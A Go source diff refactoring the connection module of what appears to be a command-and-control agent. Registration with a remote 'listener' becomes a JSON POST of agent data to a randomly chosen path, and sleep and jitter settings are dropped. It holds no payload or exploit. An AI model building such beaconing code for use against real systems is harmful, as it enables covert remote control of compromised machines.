@@ -1,6 +1,7 @@
-package core
+package connection
 
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
 	"math/rand"
@@ -12,19 +13,9 @@ type registrationResponse struct {
 	AgentID string `json:"agent_id"`
 }
 
-type taskLaunchMessage struct {
-	TaskID    string         `json:"task_id"`
-	Command   string         `json:"command"`
-	Arguments map[string]any `json:"arguments"`
-	Data      any            `json:"data"`
-}
-
 type Connection struct {
 	remoteHost           string
 	remotePort           int
-	sleepTime            float64
-	sleepTimeJitter      float64
-	agentType            string
 	tasksUrlPaths        []string
 	resultsUrlPaths      []string
 	registrationUrlPaths []string
@@ -36,9 +27,6 @@ type Connection struct {
 func NewConnection(
 	remoteHost string,
 	remotePort int,
-	sleepTime float64,
-	sleepTimeJitter float64,
-	agentType string,
 	tasksUrlPathsJson []string,
 	resultsUrlPathsJson []string,
 	registrationUrlPathsJson []string,
@@ -47,9 +35,6 @@ func NewConnection(
 	return &Connection{
 		remoteHost:           remoteHost,
 		remotePort:           remotePort,
-		sleepTime:            sleepTime,
-		sleepTimeJitter:      sleepTimeJitter,
-		agentType:            agentType,
 		tasksUrlPaths:        tasksUrlPathsJson,
 		resultsUrlPaths:      resultsUrlPathsJson,
 		registrationUrlPaths: registrationUrlPathsJson,
@@ -59,12 +44,28 @@ func NewConnection(
 	}
 }
 
-func (c *Connection) RegisterWithListener(extraHeaders map[string]string) (string, error) {
-	resp, err := http.Get(c.listenerBaseUrl + c.registrationUrlPaths[rand.Intn(len(c.registrationUrlPaths))])
+func (c *Connection) RegisterWithListener(agentData map[string]any) (string, error) {
+	jsonData, err := json.Marshal(agentData)
 	if err != nil {
 		return "", err
 	}
 
+	randomPath := c.registrationUrlPaths[rand.Intn(len(c.registrationUrlPaths))]
+	randomRegisterUrl := c.listenerBaseUrl + randomPath
+	req, err := http.NewRequest("POST", randomRegisterUrl, bytes.NewBuffer(jsonData))
+	if err != nil {
+		return "", err
+	}
+
+	req.Header.Set("Content-Type", "application/json")
+	for key, value := range c.extraHeaders {
+		req.Header.Set(key, value)
+	}
+
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return "", err
+	}
 	defer resp.Body.Close()
 
 	if resp.StatusCode != http.StatusOK {
